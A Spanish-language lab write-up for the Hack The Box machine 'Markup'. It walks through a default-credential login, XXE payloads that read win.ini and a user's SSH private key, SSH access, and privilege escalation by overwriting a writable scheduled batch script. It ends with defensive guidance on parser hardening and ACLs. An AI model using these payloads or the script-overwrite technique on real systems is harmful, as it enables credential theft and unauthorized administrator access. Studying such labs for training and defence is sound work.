---
title: Markup (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, xxe, ssh, windows, privesc, xml, web]
type: nota
status: en-progreso
source: claude-code
aliases: [Markup HTB, HTB Markup, XXE SSH privesc]
---

# Markup — HTB Starting Point (Tier 2)

**Tier 2 · SO: Windows · Dificultad: Very Easy · Skills: XXE Injection, SSH key exfiltration, Windows privilege escalation (scheduled script con permisos inseguros)**

> Hack The Box es un laboratorio legal y autorizado de ciberseguridad — nunca apliques estas técnicas fuera de entornos con permiso explícito.

Markup es una máquina Windows que encadena tres debilidades clásicas: credenciales por defecto en una web, un parser XML sin restricciones (XXE), y un script de administración periódico que cualquier usuario puede sobrescribir. Es el laboratorio ideal para ver cómo un atacante va escalando privilegios paso a paso sin explotar vulnerabilidades de memoria.

---

## Objetivo

Obtener la flag de usuario leyendo un fichero del sistema vía XXE y la flag de root sobrescribiendo un script periódico ejecutado con privilegios de Administrator.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría**: enumeración de puertos / fingerprinting de servicios.

```bash
nmap -sC -sV -oN markup.nmap <IP>
```

Puertos abiertos esperados:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22     | SSH      | OpenSSH para Windows |
| 80     | HTTP     | Servidor web con formulario de login |
| 443    | HTTPS    | Mismo contenido (certificado autofirmado) |

El puerto 80/443 expone una aplicación web con autenticación. El puerto 22 es el vector de entrada post-explotación.

---

## Enumeración

**Categoría**: credenciales por defecto / exploración de funcionalidad web.

### 1. Login con credenciales por defecto

Acceder a `http://<IP>` y probar la combinación más básica:

```
usuario: admin
contraseña: password
```

Si no funcionan a la primera, probar variantes (`admin/admin`, `admin/admin123`). Las máquinas Starting Point suelen usar combinaciones muy obvias; ajusta contra la máquina en vivo.

### 2. Explorar la aplicación

Tras autenticarse aparece una interfaz para gestionar pedidos/órdenes. La clave es buscar la funcionalidad que **envía o genera XML** — normalmente un formulario de pedido o una solicitud de compra. Intercepta la petición con Burp Suite (o `curl`) para ver el cuerpo raw:

```http
POST /process.php HTTP/1.1
Host: <IP>
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<order>
  <item>Widget</item>
  <quantity>1</quantity>
</order>
```

El servidor recibe XML y lo procesa — señal de posible XXE si el parser no deshabilita entidades externas.

---

## Acceso inicial (foothold)

**Categoría**: XXE Injection (XML External Entity) → lectura de ficheros → exfiltración de clave SSH privada.

### Patrón XXE — cómo funciona

Un parser XML inseguro permite declarar **entidades externas** que referencian recursos del sistema de ficheros o URLs remotas. Al expandir la entidad, el servidor incluye el contenido del fichero en su respuesta.

```
Atacante          Servidor
   │                 │
   │─── XML con ────>│
   │    &xxe;        │   Parser lee:
   │                 │   file:///C:/Windows/win.ini
   │<── Respuesta ───│
   │    con contenido│
```

### Payload XXE

Modifica la petición XML interceptada para incluir la declaración de entidad externa y referenciarla en uno de los campos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<order>
  <item>&xxe;</item>
  <quantity>1</quantity>
</order>
```

Si el servidor devuelve el contenido de `win.ini` en la respuesta, el XXE está confirmado.

### Leer la clave SSH del usuario daniel

El objetivo es obtener acceso por SSH. En Windows, si hay OpenSSH configurado, la clave privada suele estar en:

```
C:\Users\daniel\.ssh\id_rsa
```

Payload para exfiltrar la clave:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa">
]>
<order>
  <item>&xxe;</item>
  <quantity>1</quantity>
</order>
```

La respuesta contendrá el bloque PEM completo (`-----BEGIN RSA PRIVATE KEY-----` ... `-----END RSA PRIVATE KEY-----`). Cópialo y guárdalo localmente:

```bash
# En tu máquina atacante
nano id_rsa_daniel
# Pega la clave, asegúrate de no añadir espacios extra
chmod 600 id_rsa_daniel
```

> **Ajuste en vivo**: el nombre de usuario puede diferir. Si `daniel` no funciona, prueba a leer `C:/Users/` vía XXE o enumera con otras rutas típicas de Windows.

### Conectar por SSH

```bash
ssh -i id_rsa_daniel daniel@<IP>
```

Una vez dentro, busca la flag de usuario:

```powershell
type C:\Users\daniel\Desktop\user.txt
```

---

## Escalada de privilegios

**Categoría**: Windows privesc por permisos inseguros en script periódico (scheduled task / script escribible).

### Patrón: script ejecutado con privilegios elevados + escribible por usuario sin privilegios

En Windows es frecuente encontrar scripts `.bat` o `.ps1` ejecutados automáticamente por el Administrador (vía Scheduled Tasks o servicios) que por error tienen permisos de escritura para usuarios normales.

### 1. Localizar el script vulnerable

Busca ficheros `.bat` en rutas de sistema o de administración:

```powershell
Get-ChildItem -Path C:\ -Filter *.bat -Recurse -ErrorAction SilentlyContinue
```

O revisa las tareas programadas para ver qué ejecutan:

```powershell
schtasks /query /fo LIST /v | findstr /i "task\|run\|author"
```

Un candidato típico en Markup es algo como `C:\Users\Administrator\Desktop\job.bat` o similar. Confirma que tu usuario puede escribirlo:

```powershell
icacls "C:\ruta\al\script.bat"
```

Si ves `daniel:(F)` o `(W)`, tienes escritura completa — la vulnerabilidad existe.

### 2. Sobrescribir el script para exfiltrar la flag

La estrategia más sencilla es hacer que el script copie `root.txt` a un lugar legible por daniel:

```powershell
# Sobrescribe el .bat con un comando que copie la flag
echo copy C:\Users\Administrator\Desktop\root.txt C:\Users\daniel\root_copy.txt > "C:\ruta\al\script.bat"
```

Espera a que la tarea programada se ejecute (suele ser en segundos o pocos minutos en HTB). Luego:

```powershell
type C:\Users\daniel\root_copy.txt
```

> **Alternativa**: si quieres una shell de Administrator en lugar de solo la flag, puedes hacer que el `.bat` ejecute `net localgroup administrators daniel /add` o una reverse shell. Para CTF el método de copiar la flag es suficiente.

---

## Flags

| Flag | Ubicación típica | Cómo obtenerla |
|------|-----------------|----------------|
| `user.txt` | `C:\Users\daniel\Desktop\user.txt` | Leer tras conectar por SSH |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` | Leer tras sobrescribir el script y esperar ejecución |

```
user.txt → <flag>
root.txt → <flag>
```

---

## Patron y teoria

Esta máquina encadena tres debilidades que se presentan juntas con frecuencia en entornos reales — sobre todo en aplicaciones web internas o legacy.

### Cadena de ataque

```
Credenciales por defecto
        ↓
  Acceso a la app
        ↓
  XXE Injection
  (parser XML sin restricciones)
        ↓
  Lectura de clave SSH privada
        ↓
  Acceso SSH como usuario
        ↓
  Script periódico escribible
  (permisos inseguros)
        ↓
  Flag de Administrator
```

### 1. Credenciales por defecto

**Categoria**: misconfiguration / hardening incompleto.

El primer punto de entrada es siempre el más barato para el atacante. Las credenciales por defecto son responsabilidad del proceso de despliegue, no del código. En cualquier aplicación que el equipo dev deploya, hay que:

- Forzar cambio de contraseña en primer login.
- Rechazar contraseñas que coincidan con el nombre de usuario, producto o empresa.
- Auditar cuentas de servicio y cuentas de admin creadas durante el setup.

### 2. XXE — XML External Entity Injection

**Categoria**: OWASP A05 (Security Misconfiguration) / A03 (Injection).

El problema no es XML en sí — es el parser configurado para expandir entidades externas. Esta feature era "útil" en los 90; hoy es casi siempre un vector de ataque.

**Como desarrollador, la defensa tiene tres capas**:

```python
# Ejemplo en Python con lxml (defensa correcta)
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,   # deshabilita entidades externas
    no_network=True,          # prohíbe acceso a red desde el parser
    load_dtd=False            # no carga DTDs externas
)
tree = etree.fromstring(xml_input, parser)
```

En Java con SAXParser:

```java
saxParserFactory.setFeature(
    "http://xml.org/sax/features/external-general-entities", false);
saxParserFactory.setFeature(
    "http://xml.org/sax/features/external-parameter-entities", false);
```

Si tu aplicación no necesita procesar XML generado por el cliente, considera sustituir la API por JSON — tiene una superficie de ataque significativamente menor.

### 3. Clave SSH privada como secreto en el sistema de ficheros

Que la clave de un usuario esté en el sistema de ficheros es esperado. El problema es que el XXE permite leerla. La defensa es complementaria:

- **Parchea el XXE** — es la causa raíz.
- **Passphrase en la clave privada** — incluso si un atacante exfiltra `id_rsa`, necesitará romper la passphrase.
- **Principio de mínimo privilegio en el servidor**: la cuenta que procesa el XML no debería poder leer ficheros de otros usuarios.

### 4. Script periódico con permisos inseguros (Windows privesc clásico)

**Categoria**: Windows privilege escalation / broken access control.

En Windows, los permisos de ficheros son fáciles de malconfigurar, especialmente cuando un administrador crea un script y lo ejecuta como tarea programada sin revisar las ACLs. El patrón es:

```
Tarea programada (SYSTEM / Administrator)
    ejecuta → script.bat
              (escribible por usuario sin privilegios)
```

**Defensa**:

- Ejecuta `icacls` sobre todos los scripts referenciados en tareas programadas y servicios. Nadie excepto SYSTEM/Administrators debe tener Write sobre ellos.
- En el SDLC, include un paso de revisión de ACLs en el checklist de hardening pre-producción.
- Prefiere `PowerShell` con firma de scripts (`Set-ExecutionPolicy AllSigned`) para que scripts no firmados no puedan ejecutarse aunque el atacante los sobrescriba.
- Usa el principio de mínimo privilegio también para las tareas programadas: si la tarea solo necesita leer logs, no la ejecutes como Administrator.

### Leccion de diseno (purple team)

> Un atacante no necesita explotar vulnerabilidades de memoria complejas si puede encadenar tres misconfiguraciones triviales. La defensa en profundidad (defense in depth) exige que **cada capa falle de forma independiente** — si el XXE falla, la clave no se expone; si la clave no se expone, el atacante no entra por SSH; si los permisos son correctos, no hay privesc.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
